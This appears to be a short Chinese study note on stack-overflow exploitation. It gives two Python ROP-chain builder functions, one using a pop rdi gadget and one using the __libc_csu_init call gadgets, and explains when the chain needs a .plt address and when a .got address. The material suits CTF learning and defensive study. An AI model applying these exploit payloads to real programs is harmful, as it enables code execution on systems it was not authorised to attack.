###
Tips:
```
*1
def gadget_arg1(func_addr, arg):
    payload = overwrite
    payload += p64(poprdiret_addr)
    payload += p64(arg)
    payload += p64(func_addr)
    payload += p64(vulnfunc_addr)
    return payload
*2
def gadget_call(func_addr, arg1=0, arg2=0, arg3=0, init_ret1=movcall_addr, init_ret2=vulnfunc_addr):
    payload = overwrite
    payload += p64(pop5ret_addr)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)
    payload += p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(init_ret1)    # call 
    payload += '\x00'*(7*0x8)       # pop7
    payload += p64(init_ret2)   # 最后返回到有漏洞的地方下次再次利用
    return payload
```

注意上面这两个函数。
1最后是ret左右func_addr应该是plt段的函数地址，
例如.plt [puts] = 0x400500 
调用的时候是rip先到0x400500(这里的指令对应jmp 0x7???????)然后跳到该函数真正地址
但是如果ret 0x601018(这是got表 里面存的是真正的函数地址的值) 就会执行0x601018这个地址对应的值(转换成code)

2是call func_addr, 所以必须是got的地址
.got[read] = 0x601028
调用的时候是call 0x601028(call的是真正的函数的地址 比如call 0x7ff????????)
但是如果用ret 就会ret到0x601028 rip指向0x601028 明显不是真正func_addr的地址

所以 总结来说就是
ret 后面必须是 .plt
__libc_init 里用call来必须是 .got的


